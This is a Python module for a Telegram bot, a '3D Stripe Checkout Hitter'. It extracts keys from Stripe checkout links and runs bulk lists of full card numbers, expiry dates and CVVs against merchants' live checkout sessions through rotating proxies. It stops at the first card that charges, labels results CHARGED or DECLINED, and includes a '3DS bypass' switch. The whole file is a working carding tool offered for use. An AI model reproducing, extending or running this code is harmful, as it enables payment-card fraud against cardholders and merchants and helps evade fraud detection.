
# hitter_3d.py - 3D Stripe Checkout Hitter (Integrated from v2)

from telebot import types
import aiohttp
import asyncio
import time
import re
import json
import os
import base64
from urllib.parse import unquote

# Configuration
PROXY_FILE = "proxies.json"

HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

import threading
import asyncio

_thread_local = threading.local()

import asyncio
import threading

_thread_local = threading.local()

def run_async(coro):
    loop = getattr(_thread_local, "loop", None)

    # First time in this thread → create loop and start it
    if loop is None or loop.is_closed():
        loop = asyncio.new_event_loop()
        _thread_local.loop = loop

        def start_loop(loop):
            asyncio.set_event_loop(loop)
            loop.run_forever()

        t = threading.Thread(target=start_loop, args=(loop,), daemon=True)
        t.start()

    # Now we are GUARANTEED the loop is running
    future = asyncio.run_coroutine_threadsafe(coro, loop)
    return future.result()

#_session = None

# ========== PROXY MANAGEMENT ==========

def load_proxies() -> dict:
    if os.path.exists(PROXY_FILE):
        try:
            with open(PROXY_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_proxies(data: dict):
    with open(PROXY_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def parse_proxy_format(proxy_str: str) -> dict:
    proxy_str = proxy_str.strip()
    result = {"user": None, "password": None, "host": None, "port": None, "raw": proxy_str}
    
    try:
        if '@' in proxy_str:
            if proxy_str.count('@') == 1:
                auth_part, host_part = proxy_str.rsplit('@', 1)
                if ':' in auth_part:
                    result["user"], result["password"] = auth_part.split(':', 1)
                if ':' in host_part:
                    result["host"], port_str = host_part.rsplit(':', 1)
                    result["port"] = int(port_str)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
                result["user"] = parts[2]
                result["password"] = parts[3]
            elif len(parts) == 2:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
    except:
        pass
    
    return result

def get_proxy_url(proxy_str: str) -> str:
    parsed = parse_proxy_format(proxy_str)
    if parsed["host"] and parsed["port"]:
        if parsed["user"] and parsed["password"]:
            return f"http://{parsed['user']}:{parsed['password']}@{parsed['host']}:{parsed['port']}"
        else:
            return f"http://{parsed['host']}:{parsed['port']}"
    return None

def get_user_proxies(user_id: int) -> list:
    proxies = load_proxies()
    user_data = proxies.get(str(user_id), [])
    if isinstance(user_data, str):
        return [user_data] if user_data else []
    return user_data if isinstance(user_data, list) else []

def add_user_proxy(user_id: int, proxy: str):
    proxies = load_proxies()
    user_key = str(user_id)
    if user_key not in proxies:
        proxies[user_key] = []
    elif isinstance(proxies[user_key], str):
        proxies[user_key] = [proxies[user_key]] if proxies[user_key] else []
    
    if proxy not in proxies[user_key]:
        proxies[user_key].append(proxy)
    save_proxies(proxies)

def remove_user_proxy(user_id: int, proxy: str = None):
    proxies = load_proxies()
    user_key = str(user_id)
    if user_key in proxies:
        if proxy is None or proxy.lower() == "all":
            del proxies[user_key]
        else:
            if isinstance(proxies[user_key], list):
                proxies[user_key] = [p for p in proxies[user_key] if p != proxy]
                if not proxies[user_key]:
                    del proxies[user_key]
            elif isinstance(proxies[user_key], str) and proxies[user_key] == proxy:
                del proxies[user_key]
        save_proxies(proxies)
        return True
    return False

def get_user_proxy(user_id: int) -> str:
    user_proxies = get_user_proxies(user_id)
    if user_proxies:
        import random
        return random.choice(user_proxies)
    return None

def obfuscate_ip(ip: str) -> str:
    if not ip:
        return "N/A"
    parts = ip.split('.')
    if len(parts) == 4:
        return f"{parts[0][0]}XX.{parts[1][0]}XX.{parts[2][0]}XX.{parts[3][0]}XX"
    return "N/A"

# ========== ASYNC SESSION ==========
# Redesigned,to work proper....!!

import asyncio

async def get_session():
    loop = asyncio.get_running_loop()

    if not hasattr(loop, "_aiohttp_session") or loop._aiohttp_session.closed:
        loop._aiohttp_session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=25),
            connector=aiohttp.TCPConnector(limit=100, ssl=False)
        )

    return loop._aiohttp_session

# ========== STRIPE FUNCTIONS ==========

def extract_checkout_url(text: str) -> str:
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            url = m.group(0).rstrip('.,;:')
            return url
    return None

def decode_pk_from_url(url: str) -> dict:
    result = {"pk": None, "cs": None, "site": None}
    
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        
        if '#' not in url:
            return result
        
        hash_part = url.split('#')[1]
        hash_decoded = unquote(hash_part)
        
        try:
            decoded_bytes = base64.b64decode(hash_decoded)
            xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
            
            pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
            if pk_match:
                result["pk"] = pk_match.group(0)
            
            site_match = re.search(r'https?://[^\s\"\'\<\>]+', xored)
            if site_match:
                result["site"] = site_match.group(0)
        except:
            pass
            
    except:
        pass
    
    return result

def parse_card(text: str) -> dict:
    text = text.strip()
    parts = re.split(r'[|:/\\\-\s]+', text)
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        return None
    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        return None
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}

def parse_cards(text: str) -> list:
    cards = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if line:
            card = parse_card(line)
            if card:
                cards.append(card)
    return cards

def get_currency_symbol(currency: str) -> str:
    symbols = {
        "USD": "$", "EUR": "€", "GBP": "£", "INR": "₹", "JPY": "¥",
        "CNY": "¥", "KRW": "₩", "RUB": "₽", "BRL": "R$", "CAD": "C$",
        "AUD": "A$", "MXN": "MX$", "SGD": "S$", "HKD": "HK$", "THB": "฿",
        "VND": "₫", "PHP": "₱", "IDR": "Rp", "MYR": "RM", "ZAR": "R",
        "CHF": "CHF", "SEK": "kr", "NOK": "kr", "DKK": "kr", "PLN": "zł",
        "TRY": "₺", "AED": "د.إ", "SAR": "﷼", "ILS": "₪", "TWD": "NT$"
    }
    return symbols.get(currency, "")

async def get_checkout_info(url: str) -> dict:
    start = time.perf_counter()
    result = {
        "url": url,
        "pk": None,
        "cs": None,
        "merchant": None,
        "price": None,
        "currency": None,
        "product": None,
        "country": None,
        "mode": None,
        "customer_name": None,
        "customer_email": None,
        "init_data": None,
        "error": None,
        "time": 0
    }
    
    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        
        if result["pk"] and result["cs"]:
            s = await get_session()
            body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
            
            async with s.post(
                f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                headers=HEADERS,
                data=body
            ) as r:
                init_data = await r.json()
            
            if "error" not in init_data:
                result["init_data"] = init_data
                
                acc = init_data.get("account_settings", {})
                result["merchant"] = acc.get("display_name") or acc.get("business_name")
                result["country"] = acc.get("country")
                
                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    result["price"] = lig.get("total", 0) / 100
                    result["currency"] = lig.get("currency", "").upper()
                    if lig.get("line_items"):
                        items = lig["line_items"]
                        currency = lig.get("currency", "").upper()
                        sym = get_currency_symbol(currency)
                        product_parts = []
                        for item in items:
                            qty = item.get("quantity", 1)
                            name = item.get("name", "Product")
                            amt = item.get("amount", 0) / 100
                            interval = item.get("recurring_interval")
                            if interval:
                                product_parts.append(f"{qty} × {name} (at {sym}{amt:.2f} / {interval})")
                            else:
                                product_parts.append(f"{qty} × {name} ({sym}{amt:.2f})")
                        result["product"] = ", ".join(product_parts)
                elif inv:
                    result["price"] = inv.get("total", 0) / 100
                    result["currency"] = inv.get("currency", "").upper()
                
                mode = init_data.get("mode", "")
                if mode:
                    result["mode"] = mode.upper()
                elif init_data.get("subscription"):
                    result["mode"] = "SUBSCRIPTION"
                else:
                    result["mode"] = "PAYMENT"
                
                cust = init_data.get("customer") or {}
                result["customer_name"] = cust.get("name")
                result["customer_email"] = init_data.get("customer_email") or cust.get("email")
                
            else:
                result["error"] = init_data.get("error", {}).get("message", "Init failed")
        else:
            result["error"] = "Could not decode PK/CS from URL"
            
    except Exception as e:
        result["error"] = str(e)
    
    result["time"] = round(time.perf_counter() - start, 2)
    return result

async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, bypass_3ds: bool = False, max_retries: int = 2) -> dict:
    start = time.perf_counter()
    card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0
    }
    
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    
    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    for attempt in range(max_retries + 1):
        try:
            proxy_url = get_proxy_url(proxy_str) if proxy_str else None
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(connector=connector) as s:
                email = init_data.get("customer_email") or "john@example.com"
                checksum = init_data.get("init_checksum", "")
                
                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
                elif inv:
                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
                else:
                    pi = init_data.get("payment_intent") or {}
                    total = subtotal = pi.get("amount", 0)
                
                cust = init_data.get("customer") or {}
                addr = cust.get("address") or {}
                name = cust.get("name") or "John Smith"
                country = addr.get("country") or "US"
                line1 = addr.get("line1") or "476 West White Mountain Blvd"
                city = addr.get("city") or "Pinetop"
                state = addr.get("state") or "AZ"
                zip_code = addr.get("postal_code") or "85929"
                
                pm_body = f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&key={pk}"
                
                async with s.post("https://api.stripe.com/v1/payment_methods", headers=HEADERS, data=pm_body, proxy=proxy_url) as r:
                    pm = await r.json()
                
                if "error" in pm:
                    err_msg = pm["error"].get("message", "Card error")
                    if "unsupported" in err_msg.lower() or "tokenization" in err_msg.lower():
                        result["status"] = "NOT SUPPORTED"
                        result["response"] = "Checkout not supported"
                    else:
                        result["status"] = "DECLINED"
                        result["response"] = err_msg
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                
                pm_id = pm.get("id")
                if not pm_id:
                    result["status"] = "FAILED"
                    result["response"] = "No PM"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                
                conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
                
                if bypass_3ds:
                    conf_body += "&return_url=https://checkout.stripe.com"
                
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=HEADERS, data=conf_body, proxy=proxy_url) as r:
                    conf = await r.json()
                
                if "error" in conf:
                    err = conf["error"]
                    dc = err.get("decline_code", "")
                    msg = err.get("message", "Failed")
                    result["status"] = "DECLINED"
                    result["response"] = f"{dc.upper()}: {msg}" if dc else msg
                else:
                    pi = conf.get("payment_intent") or {}
                    st = pi.get("status", "") or conf.get("status", "")
                    if st == "succeeded":
                        result["status"] = "CHARGED"
                        result["response"] = "Payment Successful"
                    elif st == "requires_action":
                        if bypass_3ds:
                            result["status"] = "3DS SKIP"
                            result["response"] = "3DS Cannot be bypassed"
                        else:
                            result["status"] = "3DS"
                            result["response"] = "3DS Required"
                    elif st == "requires_payment_method":
                        result["status"] = "DECLINED"
                        result["response"] = "Card Declined"
                    else:
                        result["status"] = "UNKNOWN"
                        result["response"] = st or "Unknown"
                
                result["time"] = round(time.perf_counter() - start, 2)
                return result
                    
        except Exception as e:
            err_str = str(e)
            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = err_str[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            return result
    
    return result

async def check_proxy_alive(proxy_str: str, timeout: int = 10) -> dict:
    result = {
        "proxy": proxy_str,
        "status": "dead",
        "response_time": None,
        "external_ip": None,
        "error": None
    }
    
    proxy_url = get_proxy_url(proxy_str)
    if not proxy_url:
        result["error"] = "Invalid format"
        return result
    
    try:
        start = time.perf_counter()
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "http://ip-api.com/json",
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as resp:
                elapsed = round((time.perf_counter() - start) * 1000, 2)
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "alive"
                    result["response_time"] = f"{elapsed}ms"
                    result["external_ip"] = data.get("query")
    except asyncio.TimeoutError:
        result["error"] = "Timeout"
    except Exception as e:
        result["error"] = str(e)[:30]
    
    return result

async def check_proxies_batch(proxies: list, max_threads: int = 10) -> list:
    semaphore = asyncio.Semaphore(max_threads)
    
    async def check_with_semaphore(proxy):
        async with semaphore:
            return await check_proxy_alive(proxy)
    
    tasks = [check_with_semaphore(p) for p in proxies]
    return await asyncio.gather(*tasks)

async def get_proxy_info(proxy_str: str = None, timeout: int = 10) -> dict:
    result = {
        "status": "dead",
        "ip": None,
        "ip_obfuscated": None,
        "country": None,
        "city": None,
        "org": None,
        "using_proxy": False
    }
    
    proxy_url = None
    if proxy_str:
        proxy_url = get_proxy_url(proxy_str)
        result["using_proxy"] = True
    
    try:
        async with aiohttp.ClientSession() as session:
            kwargs = {"timeout": aiohttp.ClientTimeout(total=timeout)}
            if proxy_url:
                kwargs["proxy"] = proxy_url
            
            async with session.get("http://ip-api.com/json", **kwargs) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "alive"
                    result["ip"] = data.get("query")
                    result["ip_obfuscated"] = obfuscate_ip(data.get("query"))
                    result["country"] = data.get("country")
                    result["city"] = data.get("city")
                    result["org"] = data.get("isp")
    except:
        result["status"] = "dead"
    
    return result

# ========== BOT HANDLERS ==========

def register_3d_hitter_handlers(bot, user_states):
    """Register 3D hitter handlers with the bot"""
    
    @bot.message_handler(commands=["addproxy"])
    def addproxy_handler(message):
        user_id = message.from_user.id
        args = message.text.split(maxsplit=1)
        user_proxies = get_user_proxies(user_id)
        
        if len(args) < 2:
            if user_proxies:
                proxy_list = "\n".join([f"    • `{p}`" for p in user_proxies[:10]])
                if len(user_proxies) > 10:
                    proxy_list += f"\n    • `... and {len(user_proxies) - 10} more`"
            else:
                proxy_list = "    • `None`"
            
            bot.reply_to(
                message,
                f"🔒 **Proxy Manager**\n\n"
                f"**Your Proxies ({len(user_proxies)}):**\n{proxy_list}\n\n"
                f"**Add:** `/addproxy proxy`\n"
                f"**Remove:** `/removeproxy proxy`\n"
                f"**Remove All:** `/removeproxy all`\n"
                f"**Check:** `/proxy check`\n\n"
                f"**Formats:**\n"
                f"    • `host:port:user:pass`\n"
                f"    • `user:pass@host:port`\n"
                f"    • `host:port`",
                parse_mode="Markdown"
            )
            return
        
        proxy_input = args[1].strip()
        proxies_to_add = [p.strip() for p in proxy_input.split('\n') if p.strip()]
        
        if not proxies_to_add:
            bot.reply_to(message, "❌ No valid proxies provided")
            return
        
        checking_msg = bot.reply_to(
            message,
            f"⏳ **Checking Proxies**\n\n"
            f"**Total:** `{len(proxies_to_add)}`\n"
            f"**Threads:** `10`",
            parse_mode="Markdown"
        )
        
        # Run async function
       
        results = run_async(check_proxies_batch(proxies_to_add, max_threads=10))
        
        
        alive_proxies = []
        dead_proxies = []
        
        for r in results:
            if r["status"] == "alive":
                alive_proxies.append(r)
                add_user_proxy(user_id, r["proxy"])
            else:
                dead_proxies.append(r)
        
        response = f"✅ **Proxy Check Complete**\n\n"
        response += f"**Alive:** `{len(alive_proxies)}/{len(proxies_to_add)} ✅`\n"
        response += f"**Dead:** `{len(dead_proxies)}/{len(proxies_to_add)} ❌`\n\n"
        
        if alive_proxies:
            response += "**Added:**\n"
            for p in alive_proxies[:5]:
                response += f"    • `{p['proxy']}` ({p['response_time']})\n"
            if len(alive_proxies) > 5:
                response += f"    • `... and {len(alive_proxies) - 5} more`\n"
        
        bot.edit_message_text(response, checking_msg.chat.id, checking_msg.message_id, parse_mode="Markdown")
    
    @bot.message_handler(commands=["removeproxy"])
    def removeproxy_handler(message):
        user_id = message.from_user.id
        args = message.text.split(maxsplit=1)
         
        if len(args) < 2:
            bot.reply_to(
                message,
                "🗑️ **Remove Proxy**\n\n"
                "**Usage:** `/removeproxy proxy`\n"
                "**All:** `/removeproxy all`",
                parse_mode="Markdown"
            )
            return
        
        proxy_input = args[1].strip()
        
        if proxy_input.lower() == "all":
            user_proxies = get_user_proxies(user_id)
            count = len(user_proxies)
            remove_user_proxy(user_id, "all")
            bot.reply_to(
                message,
                f"✅ **All Proxies Removed**\n\n"
                f"**Removed:** `{count} proxies`",
                parse_mode="Markdown"
            )
            return
        
        if remove_user_proxy(user_id, proxy_input):
            bot.reply_to(
                message,
                f"✅ **Proxy Removed**\n\n"
                f"**Proxy:** `{proxy_input}`",
                parse_mode="Markdown"
            )
        else:
            bot.reply_to(message, "❌ Proxy not found")
    
    @bot.message_handler(commands=["proxy"])
    def proxy_handler(message):
        user_id = message.from_user.id
        args = message.text.split(maxsplit=1)
        user_proxies = get_user_proxies(user_id)
        
        if len(args) < 2 or args[1].strip().lower() != "check":
            if user_proxies:
                proxy_list = "\n".join([f"    • `{p}`" for p in user_proxies[:10]])
                if len(user_proxies) > 10:
                    proxy_list += f"\n    • `... and {len(user_proxies) - 10} more`"
            else:
                proxy_list = "    • `None`"
            
            bot.reply_to(
                message,
                f"🔒 **Proxy Manager**\n\n"
                f"**Your Proxies ({len(user_proxies)}):**\n{proxy_list}\n\n"
                f"**Check All:** `/proxy check`",
                parse_mode="Markdown"
            )
            return
        
        if not user_proxies:
            bot.reply_to(
                message,
                "❌ **No Proxies**\n\n"
                "No proxies to check\n"
                "**Add:** `/addproxy proxy`",
                parse_mode="Markdown"
            )
            return
        
        checking_msg = bot.reply_to(
            message,
            f"⏳ **Checking Proxies**\n\n"
            f"**Total:** `{len(user_proxies)}`\n"
            f"**Threads:** `10`",
            parse_mode="Markdown"
        )
        
        # Run async function
        
        
        results = run_async(check_proxies_batch(user_proxies, max_threads=10))
        
        
        alive = [r for r in results if r["status"] == "alive"]
        dead = [r for r in results if r["status"] == "dead"]
        
        response = f"📊 **Proxy Check Results**\n\n"
        response += f"**Alive:** `{len(alive)}/{len(user_proxies)} ✅`\n"
        response += f"**Dead:** `{len(dead)}/{len(user_proxies)} ❌`\n\n"
        
        if alive:
            response += "**Alive Proxies:**\n"
            for p in alive[:5]:
                ip_display = p['external_ip'] or 'N/A'
                response += f"    • `{p['proxy']}`\n      IP: {ip_display} | {p['response_time']}\n"
            if len(alive) > 5:
                response += f"    • `... and {len(alive) - 5} more`\n"
            response += "\n"
        
        if dead:
            response += "**Dead Proxies:**\n"
            for p in dead[:3]:
                error = p.get('error', 'Unknown')
                response += f"    • `{p['proxy']}` ({error})\n"
            if len(dead) > 3:
                response += f"    • `... and {len(dead) - 3} more`\n"
        
        bot.edit_message_text(response, checking_msg.chat.id, checking_msg.message_id, parse_mode="Markdown")
    
    @bot.message_handler(commands=["3d", "co3d"])
    def co3d_handler(message):
        user_id = message.from_user.id
        start_time = time.perf_counter()
        text = message.text or ""
        lines = text.strip().split('\n')
        first_line_args = lines[0].split(maxsplit=3)
        
        if len(first_line_args) < 2:
            bot.reply_to(
                message,
                "⚡ **3D Stripe Checkout Hitter**\n\n"
                "**Usage:** `/3d url`\n"
                "**Charge:** `/3d url cc|mm|yy|cvv`\n"
                "**Bypass:** `/3d url yes/no cc|mm|yy|cvv`\n"
                "**File:** Reply to .txt with `/3d url`\n"
                "**File+Bypass:** Reply to .txt with `/3d url yes/no`",
                parse_mode="Markdown"
            )
            return
        
        url = extract_checkout_url(first_line_args[1])
        if not url:
            url = first_line_args[1].strip()
        
        cards = []
        bypass_3ds = False
        
        if len(first_line_args) > 2:
            if first_line_args[2].lower() in ['yes', 'no']:
                bypass_3ds = first_line_args[2].lower() == 'yes'
                if len(first_line_args) > 3:
                    cards = parse_cards(first_line_args[3])
            else:
                cards = parse_cards(first_line_args[2])
        
        if len(lines) > 1:
            remaining_text = '\n'.join(lines[1:])
            cards.extend(parse_cards(remaining_text))
        
        # Check for file attachment
        if message.reply_to_message and message.reply_to_message.document:
            doc = message.reply_to_message.document
            if doc.file_name and doc.file_name.endswith('.txt'):
                try:
                    file_info = bot.get_file(doc.file_id)
                    downloaded_file = bot.download_file(file_info.file_path)
                    text_content = downloaded_file.decode('utf-8')
                    cards = parse_cards(text_content)
                except Exception as e:
                    bot.reply_to(message, f"❌ Failed to read file: {str(e)}")
                    return
        
        user_proxy = get_user_proxy(user_id)
        
        if not user_proxy:
            bot.reply_to(
                message,
                "❌ **No Proxy**\n\n"
                "You must set a proxy first\n"
                "**Action:** `/addproxy host:port:user:pass`",
                parse_mode="Markdown"
            )
            return
        
        # Check proxy status
       
        proxy_info = run_async(get_proxy_info(user_proxy))
        
        if proxy_info["status"] == "dead":
            bot.reply_to(
                message,
                "❌ **Proxy Dead**\n\n"
                "Your proxy is not responding\n"
                "**Action:** Check `/proxy` or `/removeproxy`",
                parse_mode="Markdown"
            )
  #          loop.close()
            return
         
        proxy_display = f"LIVE ✅ | {proxy_info['ip_obfuscated']}"
        
        processing_msg = bot.reply_to(
            message,
            f"⏳ **Processing**\n\n"
            f"**Proxy:** `{proxy_display}`\n"
            f"**Status:** Parsing checkout...",
            parse_mode="Markdown"
        )
        
        checkout_data = run_async(get_checkout_info(url))
        
        if checkout_data.get("error"):
            bot.edit_message_text(
                f"❌ **Error**\n\n"
                f"**Detail:** `{checkout_data['error']}`",
                processing_msg.chat.id,
                processing_msg.message_id,
                parse_mode="Markdown"
            )
             
            return
        
        currency = checkout_data.get('currency', '')
        sym = get_currency_symbol(currency)
        price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
        
        if not cards:
            # Just show checkout info
            total_time = round(time.perf_counter() - start_time, 2)
            
            response = f"**「 Stripe Checkout {price_str} 」**\n\n"
            response += f"**Proxy:** `{proxy_display}`\n"
            response += f"**CS:** `{checkout_data['cs'] or 'N/A'}`\n"
            response += f"**PK:** `{checkout_data['pk'] or 'N/A'}`\n"
            response += f"**Status:** `SUCCESS ✅`\n\n"
            
            response += f"**Merchant:** `{checkout_data['merchant'] or 'N/A'}`\n"
            response += f"**Product:** `{checkout_data['product'] or 'N/A'}`\n"
            response += f"**Country:** `{checkout_data['country'] or 'N/A'}`\n"
            response += f"**Mode:** `{checkout_data['mode'] or 'N/A'}`\n\n"
            
            response += f"**Command:** `/3d`\n"
            response += f"**Time:** `{total_time}s`"
            
            bot.edit_message_text(response, processing_msg.chat.id, processing_msg.message_id, parse_mode="Markdown")
            
            return
        
        # Charge cards
        bypass_str = "YES 🔓" if bypass_3ds else "NO 🔒"
        
        bot.edit_message_text(
            f"**「 Charging {price_str} 」**\n\n"
            f"**Proxy:** `{proxy_display}`\n"
            f"**Bypass:** `{bypass_str}`\n"
            f"**Cards:** `{len(cards)}`\n"
            f"**Status:** Starting...",
            processing_msg.chat.id,
            processing_msg.message_id,
            parse_mode="Markdown"
        )
        
        results = []
        charged_card = None
        last_update = time.perf_counter()
        
        for i, card in enumerate(cards):
            result = run_async(charge_card(card, checkout_data, user_proxy, bypass_3ds))
            results.append(result)
            
            if len(cards) > 1 and (time.perf_counter() - last_update) > 2:
                last_update = time.perf_counter()
                charged = sum(1 for r in results if r['status'] == 'CHARGED')
                declined = sum(1 for r in results if r['status'] == 'DECLINED')
                three_ds = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])
                errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED'])
                
                try:
                    bot.edit_message_text(
                        f"**「 Charging {price_str} 」**\n\n"
                        f"**Proxy:** `{proxy_display}`\n"
                        f"**Bypass:** `{bypass_str}`\n"
                        f"**Progress:** `{i+1}/{len(cards)}`\n\n"
                        f"**Charged:** `{charged} ✅`\n"
                        f"**Declined:** `{declined} ❌`\n"
                        f"**3DS:** `{three_ds} 🔐`\n"
                        f"**Errors:** `{errors} ⚠️`",
                        processing_msg.chat.id,
                        processing_msg.message_id,
                        parse_mode="Markdown"
                    )
                except:
                    pass
            
            if result['status'] == 'CHARGED':
                charged_card = result
                break
        
       
        total_time = round(time.perf_counter() - start_time, 2)
        
        response = f"**「 Stripe Charge {price_str} 」**\n\n"
        response += f"**Proxy:** `{proxy_display}`\n"
        response += f"**Bypass:** `{bypass_str}`\n"
        response += f"**Merchant:** `{checkout_data['merchant'] or 'N/A'}`\n"
        response += f"**Product:** `{checkout_data['product'] or 'N/A'}`\n\n"
        
        if charged_card:
            response += f"**Card:** `{charged_card['card']}`\n"
            response += f"**Status:** `CHARGED ✅`\n"
            response += f"**Response:** `{charged_card['response']}`\n"
            response += f"**Time:** `{charged_card['time']}s`\n\n"
            
            if len(results) > 1:
                response += f"**Tried:** `{len(results)}/{len(cards)} cards`\n\n"
        elif len(results) == 1:
            r = results[0]
            if r['status'] == '3DS':
                status_emoji = "🔐"
            elif r['status'] == '3DS SKIP':
                status_emoji = "🔓"
            elif r['status'] == 'DECLINED':
                status_emoji = "❌"
            elif r['status'] == 'NOT SUPPORTED':
                status_emoji = "🚫"
            else:
                status_emoji = "⚠️"
            
            response += f"**Card:** `{r['card']}`\n"
            response += f"**Status:** `{r['status']} {status_emoji}`\n"
            response += f"**Response:** `{r['response']}`\n"
            response += f"**Time:** `{r['time']}s`\n\n"
        else:
            charged = sum(1 for r in results if r['status'] == 'CHARGED')
            declined = sum(1 for r in results if r['status'] == 'DECLINED')
            three_ds = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])
            errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED', 'UNKNOWN'])
            total = len(results)
            
            response += f"**Charged:** `{charged}/{total} ✅`\n"
            response += f"**Declined:** `{declined}/{total} ❌`\n"
            response += f"**3DS:** `{three_ds}/{total} 🔐`\n"
            if errors > 0:
                response += f"**Errors:** `{errors}/{total} ⚠️`\n"
            response += "\n"
        
        response += f"**Command:** `/3d`\n"
        response += f"**Total Time:** `{total_time}s`"
        
        bot.edit_message_text(response, processing_msg.chat.id, processing_msg.message_id, parse_mode="Markdown")
